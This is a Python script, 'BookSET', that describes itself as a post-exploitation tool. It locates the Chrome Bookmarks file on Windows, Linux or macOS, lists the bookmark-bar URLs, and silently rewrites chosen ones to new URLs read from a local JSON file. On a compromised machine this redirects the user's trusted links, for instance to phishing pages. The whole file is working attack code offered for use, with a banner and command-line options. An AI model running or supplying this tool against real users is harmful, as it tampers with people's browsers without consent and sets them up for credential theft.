import argparse
import os
import json
import pyfiglet
import platform


def detect_os():
    os_name = platform.system()
    if os_name == "Windows":
        return "win"
    elif os_name == "Linux":
        return "linux"
    elif os_name == "Darwin":
        return "mac"
    else:
        return "unknown"
    
    
def get_bookmarks_path():
    
    os_name = detect_os()
    home_dir = os.path.expanduser("~")
    if os_name == "win":
        bookmarks_path = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Bookmarks")
    elif os_name == "linux":
        bookmarks_path = os.path.join(home_dir, ".config", "google-chrome", "Default", "Bookmarks")
    elif os_name == "mac":
        bookmarks_path = os.path.join(home_dir, "Library", "Application Support", "Google", "Chrome", "Default", "Bookmarks")
    else:
        raise OSError("something its wrong :( ")

    return bookmarks_path
    #home_dir = os.path.expanduser("~")
    #bookmarks_path = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Bookmarks")
    #return bookmarks_path

def read_bookmarks():
    bookmarks_path = get_bookmarks_path()
    with open(bookmarks_path, "r", encoding="utf-8") as f:
        bookmarks = json.load(f)
    return bookmarks

def replace_bookmark_urls():
    bookmarks = read_bookmarks()
    with open("bookmarks.json", "r", encoding="utf-8") as f:
        urls_to_replace = json.load(f)
    
    modified_urls = []
    num_urls_mod = 0
    
    for url in urls_to_replace["bookmark_bar"]:
        for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
            if "url" in bookmark and bookmark["url"] == url["current_url"]:
                bookmark["url"] = url["new_url"]
                modified_urls.append(url["current_url"])
                num_urls_mod += 1
                
    with open(get_bookmarks_path(), "w", encoding="utf-8") as f:
        json.dump(bookmarks, f, ensure_ascii=False, indent=2)

    print("[+] URLs modified: ")
    print()
    for url in modified_urls:
        print("     [-]",url)
    
    print()    
    print("[+] Total of BookMarks replaced : [{0}]".format(num_urls_mod))
        
def recon_bookmarks():
    bookmarks = read_bookmarks()
    urls = []
    for bookmark in bookmarks["roots"]["bookmark_bar"]["children"]:
        if "url" in bookmark:
            urls.append(bookmark["url"])
    print("[+] Getting Urls from BookMarks: ")
    print()
    for url in urls:
        print("     [-] ",url)
    print()        
    print("[+] Total of BookMarks identified: [{0}]".format(len(urls)))
if __name__ == "__main__":
    
    banner = "BookSET"
    ASCII_art_1 = pyfiglet.figlet_format(banner)

    print()
    print(ASCII_art_1)
    print("[ just a simple post-exploitation tool :) by @_mrpack ]")
    print()
    parser = argparse.ArgumentParser(description="Get and Replace all Urls from Google Chrome BookMarks")
    parser.add_argument("-recon", action="store_true", help="Get all URLs Bookmarks")
    parser.add_argument("-replace", action="store_true", help="Replace URLs Bookmarks")
    args = parser.parse_args()

    if args.recon:
        recon_bookmarks()
    elif args.replace:
        replace_bookmark_urls()
    else:
        parser.print_help()
